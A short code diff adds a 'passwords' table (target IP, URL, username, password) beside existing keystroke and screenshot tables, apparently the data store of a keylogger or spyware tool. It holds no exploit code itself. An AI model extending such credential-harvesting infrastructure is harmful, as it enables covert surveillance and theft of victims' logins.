@@ -20,6 +20,17 @@ CREATE TABLE IF NOT EXISTS keystrokes (
 ''')
 
 cursor.execute('''
+CREATE TABLE IF NOT EXISTS passwords (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    target_ip TEXT NOT NULL,
+    timestamp TEXT NOT NULL,
+    url TEXT NOT NULL,
+    username TEXT,
+    password TEXT
+)
+''')
+
+cursor.execute('''
 CREATE TABLE IF NOT EXISTS screenshots (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     timestamp TEXT NOT NULL,
